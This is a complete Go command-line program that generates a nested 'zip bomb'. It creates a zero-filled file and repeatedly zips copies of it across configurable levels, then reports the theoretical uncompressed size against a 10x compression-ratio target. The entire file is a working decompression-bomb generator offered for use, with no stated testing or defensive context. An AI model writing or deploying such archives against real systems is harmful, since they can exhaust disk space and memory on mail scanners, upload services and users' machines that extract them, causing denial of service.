package main

import (
	"archive/zip"
	"flag"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strconv"
)

// Config holds the configuration for the zip bomb
type Config struct {
	SizeMB int
	Levels int
	Copies int
	Output string
}

// createInitialFile creates a file filled with null bytes of the specified size
func createInitialFile(filename string, sizeMB int) error {
	file, err := os.Create(filename)
	if err != nil {
		return fmt.Errorf("failed to create initial file: %w", err)
	}
	defer file.Close()

	// Write null bytes efficiently using io.CopyN from a zero reader
	zeroReader := &zeroReader{}
	sizeBytes := int64(sizeMB * 1024 * 1024)
	
	_, err = io.CopyN(file, zeroReader, sizeBytes)
	if err != nil {
		return fmt.Errorf("failed to write to initial file: %w", err)
	}

	return nil
}

// zeroReader implements io.Reader and always returns zero bytes
type zeroReader struct{}

func (z *zeroReader) Read(p []byte) (n int, err error) {
	for i := range p {
		p[i] = 0
	}
	return len(p), nil
}

// compressFile compresses a single file into a ZIP archive
func compressFile(inputFile, outputZip string) error {
	// Create the ZIP file
	zipFile, err := os.Create(outputZip)
	if err != nil {
		return fmt.Errorf("failed to create zip file: %w", err)
	}
	defer zipFile.Close()

	// Create a new ZIP writer
	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	// Open the input file
	inputFileHandle, err := os.Open(inputFile)
	if err != nil {
		return fmt.Errorf("failed to open input file: %w", err)
	}
	defer inputFileHandle.Close()

	// Create a file in the ZIP archive
	zipFileWriter, err := zipWriter.Create(filepath.Base(inputFile))
	if err != nil {
		return fmt.Errorf("failed to create file in zip: %w", err)
	}

	// Copy the file content to the ZIP
	_, err = io.Copy(zipFileWriter, inputFileHandle)
	if err != nil {
		return fmt.Errorf("failed to copy file to zip: %w", err)
	}

	return nil
}

// createCopiesAndCompress creates multiple copies of the input file and compresses them into a ZIP
func createCopiesAndCompress(inputFile, outputZip string, copies int) error {
	// Create the ZIP file
	zipFile, err := os.Create(outputZip)
	if err != nil {
		return fmt.Errorf("failed to create zip file: %w", err)
	}
	defer zipFile.Close()

	// Create a new ZIP writer
	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	// Read the input file once
	inputData, err := os.ReadFile(inputFile)
	if err != nil {
		return fmt.Errorf("failed to read input file: %w", err)
	}

	// Create multiple copies in the ZIP
	baseFilename := filepath.Base(inputFile)
	ext := filepath.Ext(baseFilename)
	nameWithoutExt := baseFilename[:len(baseFilename)-len(ext)]

	for i := 0; i < copies; i++ {
		copyName := fmt.Sprintf("%s-%d%s", nameWithoutExt, i, ext)
		
		// Create a file in the ZIP archive
		zipFileWriter, err := zipWriter.Create(copyName)
		if err != nil {
			return fmt.Errorf("failed to create copy %d in zip: %w", i, err)
		}

		// Write the data to the ZIP
		_, err = zipFileWriter.Write(inputData)
		if err != nil {
			return fmt.Errorf("failed to write copy %d to zip: %w", i, err)
		}
	}

	return nil
}

// calculateExpansionRatio calculates the theoretical expansion ratio
func calculateExpansionRatio(sizeMB, levels, copies int) int {
	ratio := sizeMB
	for i := 0; i < levels; i++ {
		ratio *= copies
	}
	return ratio
}

// getFileSize returns the size of a file in bytes
func getFileSize(filename string) (int64, error) {
	info, err := os.Stat(filename)
	if err != nil {
		return 0, err
	}
	return info.Size(), nil
}

func main() {
	// Parse command-line flags
	config := Config{}
	flag.IntVar(&config.SizeMB, "size", 0, "Size of the initial file in MB (required)")
	flag.IntVar(&config.Levels, "levels", 3, "Number of nested ZIP levels to create")
	flag.IntVar(&config.Copies, "copies", 3, "Number of copies to include in each level")
	flag.StringVar(&config.Output, "output", "zipbomb.zip", "Output filename for the zip bomb")
	flag.Parse()

	// Validate required parameters
	if config.SizeMB <= 0 {
		fmt.Fprintf(os.Stderr, "Error: -size parameter is required and must be positive\n")
		flag.Usage()
		os.Exit(1)
	}

	if config.Levels < 1 {
		fmt.Fprintf(os.Stderr, "Error: -levels must be at least 1\n")
		os.Exit(1)
	}

	if config.Copies < 1 {
		fmt.Fprintf(os.Stderr, "Error: -copies must be at least 1\n")
		os.Exit(1)
	}

	fmt.Printf("Creating zip bomb with:\n")
	fmt.Printf("  Initial file size: %d MB\n", config.SizeMB)
	fmt.Printf("  Levels: %d\n", config.Levels)
	fmt.Printf("  Copies per level: %d\n", config.Copies)
	fmt.Printf("  Expected expansion ratio: %dx\n", calculateExpansionRatio(config.SizeMB, config.Levels, config.Copies))

	// Create temporary files for processing
	initFile := "temp_file.txt"
	currentZip := "temp_0.zip"

	// Clean up temporary files
	defer func() {
		os.Remove(initFile)
		for i := 0; i <= config.Levels; i++ {
			os.Remove("temp_" + strconv.Itoa(i) + ".zip")
		}
	}()

	// Step 1: Create initial file
	fmt.Printf("Creating initial file (%d MB)...\n", config.SizeMB)
	err := createInitialFile(initFile, config.SizeMB)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error creating initial file: %v\n", err)
		os.Exit(1)
	}

	// Step 2: Compress initial file
	fmt.Printf("Compressing initial file...\n")
	err = compressFile(initFile, currentZip)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error compressing initial file: %v\n", err)
		os.Exit(1)
	}
	os.Remove(initFile) // Clean up initial file

	// Step 3: Create nested levels
	for level := 1; level <= config.Levels; level++ {
		nextZip := "temp_" + strconv.Itoa(level) + ".zip"
		fmt.Printf("Creating level %d (with %d copies)...\n", level, config.Copies)
		
		err = createCopiesAndCompress(currentZip, nextZip, config.Copies)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error creating level %d: %v\n", level, err)
			os.Exit(1)
		}
		
		os.Remove(currentZip) // Clean up previous level
		currentZip = nextZip
	}

	// Step 4: Rename final file to output name
	err = os.Rename(currentZip, config.Output)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error renaming final file: %v\n", err)
		os.Exit(1)
	}

	// Step 5: Report results
	compressedSize, err := getFileSize(config.Output)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error getting compressed file size: %v\n", err)
		os.Exit(1)
	}

	theoreticalUncompressedMB := calculateExpansionRatio(config.SizeMB, config.Levels, config.Copies)
	actualRatio := float64(theoreticalUncompressedMB*1024*1024) / float64(compressedSize)

	fmt.Printf("\nZip bomb created successfully: %s\n", config.Output)
	fmt.Printf("Compressed size: %.2f KB (%.2f MB)\n", float64(compressedSize)/1024, float64(compressedSize)/(1024*1024))
	fmt.Printf("Theoretical uncompressed size: %d MB\n", theoreticalUncompressedMB)
	fmt.Printf("Compression ratio: %.2fx\n", actualRatio)

	if actualRatio >= 10 {
		fmt.Printf("✓ Successfully achieved 10x+ compression ratio!\n")
	} else {
		fmt.Printf("⚠ Warning: Compression ratio is below 10x target\n")
	}
}